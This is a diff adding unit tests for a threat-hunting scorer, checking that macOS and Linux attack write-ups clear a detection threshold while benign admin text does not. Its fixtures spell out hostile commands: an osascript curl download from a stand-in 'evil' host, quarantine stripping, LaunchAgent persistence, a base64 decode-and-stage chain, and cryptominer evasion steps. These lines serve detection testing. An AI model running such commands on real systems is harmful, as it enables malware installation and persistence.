@@ -348,3 +348,97 @@ class TestThreatHuntingScorer:
 
         # Check score range
         assert 0.0 <= result["threat_hunting_score"] <= 100.0
+
+
+class TestNonWindowsHuntScoring:
+    """Platform-complete huntability: high-fidelity macOS/Linux carriers must let a genuinely
+    huntable non-Windows article clear the auto-trigger gate (85), while benign sysadmin prose
+    and single passing mentions must NOT. Calibration: spec
+    docs/superpowers/specs/2026-06-20-unified-keyword-platform-scoring-design.md §9.1.
+    """
+
+    AUTO_TRIGGER = 85.0
+
+    def test_macos_persistence_article_clears_autotrigger(self):
+        """A realistic macOS CTI write-up (huntable artifacts + threat-intel context) must reach
+        >= 85 so it is no longer dropped before processing. NOTE: the perfect bucket asymptotes at
+        75, so clearing 85 requires the supporting buckets too (good/intel) — which real CTI
+        articles carry. Pure-technical articles light on intel vocabulary remain a residual the
+        configurable threshold covers (spec §9.1)."""
+        content = (
+            "In this campaign the Lazarus threat actor delivered a macOS payload. The dropper "
+            "executes osascript -e 'do shell script \"curl -fsSL https://evil/x -o /tmp/x\"', then "
+            "establishes persistence by writing ~/Library/LaunchAgents/com.evil.helper.plist and "
+            "loading it with launchctl load. To evade Gatekeeper it strips the flag with "
+            "xattr -d com.apple.quarantine, queries TCC.db for privacy permissions, and runs dscl "
+            "to enumerate local accounts before the downloader payload beacons to its C2."
+        )
+        result = ThreatHuntingScorer.score_threat_hunting_content("macOS stealer analysis", content)
+        assert result["threat_hunting_score"] >= self.AUTO_TRIGGER, result["threat_hunting_score"]
+
+    def test_macos_carriers_are_perfect_discriminators(self):
+        """The macOS carriers must land in the perfect bucket (only perfect-tier moves an 85 gate)."""
+        content = (
+            "osascript do shell script launchctl LaunchAgents LaunchDaemons "
+            "com.apple.quarantine xattr TCC.db dscl plutil"
+        )
+        result = ThreatHuntingScorer.score_threat_hunting_content("t", content)
+        perfect = {m.lower() for m in result["perfect_keyword_matches"]}
+        for token in ("osascript", "do shell script", "launchctl", "com.apple.quarantine", "tcc.db"):
+            assert token in perfect, (token, result["perfect_keyword_matches"])
+
+    def test_benign_linux_sysadmin_not_autotriggered(self):
+        """Generic Linux admin tokens (systemctl / chmod +x / crontab) are good/lolbas at most —
+        a how-to with marketing prose must stay below the gate (FP guard)."""
+        content = (
+            "To deploy, run chmod +x deploy.sh and systemctl enable myapp. See our best "
+            "practices guide and free trial for how to set up a crontab entry."
+        )
+        result = ThreatHuntingScorer.score_threat_hunting_content("How to set up a service", content)
+        assert result["threat_hunting_score"] < self.AUTO_TRIGGER, result["threat_hunting_score"]
+
+    def test_single_macos_mention_does_not_autotrigger(self):
+        """One passing carrier mention (n_perfect=1 -> ~37.5) must not cross the gate — the
+        geometry, not FP-prone vocabulary, is what protects against single-mention over-trigger."""
+        content = "The report briefly mentions osascript as one technique among many. " + "context. " * 30
+        result = ThreatHuntingScorer.score_threat_hunting_content("survey", content)
+        assert result["threat_hunting_score"] < self.AUTO_TRIGGER, result["threat_hunting_score"]
+
+    def test_linux_generic_tokens_not_perfect(self):
+        """Generic Linux admin tokens (systemctl / crontab / chmod +x / insmod) must NOT be
+        perfect — they carry benign-sysadmin / driver-dev false positives."""
+        content = "systemctl crontab chmod +x insmod"
+        result = ThreatHuntingScorer.score_threat_hunting_content("t", content)
+        perfect = {m.lower() for m in result["perfect_keyword_matches"]}
+        for token in ("systemctl", "crontab", "chmod +x", "insmod"):
+            assert token not in perfect, (token, result["perfect_keyword_matches"])
+
+    def test_linux_cryptojacking_clears_autotrigger(self):
+        """A realistic Linux cryptojacking write-up (xmrig + fileless + anti-removal + persistence
+        + intel context) must reach >= 85. xmrig alone covers ~36 corpus articles."""
+        content = (
+            "This cryptojacking campaign by a known threat actor targets Linux servers in the "
+            "wild. The dropper writes its XMRig miner payload to /tmp/, uses memfd_create for "
+            "fileless execution, applies chattr +i to lock the binary against removal, persists "
+            "via a cron.d entry and /etc/rc.local, and runs history -c to clear shell history."
+        )
+        result = ThreatHuntingScorer.score_threat_hunting_content("Linux cryptojacking analysis", content)
+        assert result["threat_hunting_score"] >= self.AUTO_TRIGGER, result["threat_hunting_score"]
+
+    def test_linux_carriers_are_perfect_discriminators(self):
+        """The validated low-FP Linux carriers must land in the perfect bucket."""
+        content = "xmrig memfd_create chattr +i ld.so.preload cron.d /etc/rc.local history -c /proc/self/exe"
+        result = ThreatHuntingScorer.score_threat_hunting_content("t", content)
+        perfect = {m.lower() for m in result["perfect_keyword_matches"]}
+        for token in ("xmrig", "memfd_create", "chattr +i"):
+            assert token in perfect, (token, result["perfect_keyword_matches"])
+
+    def test_decode_and_stage_carriers_promoted_to_perfect(self):
+        """base64 -d (decode-and-execute) and chmod 777 (world-writable payload staging) were
+        promoted from good after context review — in the CTI corpus they appear only in malware
+        command chains. Note: chmod +x (benign tutorial token) stays good."""
+        content = "base64 -d /tmp/x.b64 > /tmp/x && chmod 777 /tmp/x"
+        result = ThreatHuntingScorer.score_threat_hunting_content("t", content)
+        perfect = {m.lower() for m in result["perfect_keyword_matches"]}
+        assert "base64 -d" in perfect, result["perfect_keyword_matches"]
+        assert "chmod 777" in perfect, result["perfect_keyword_matches"]
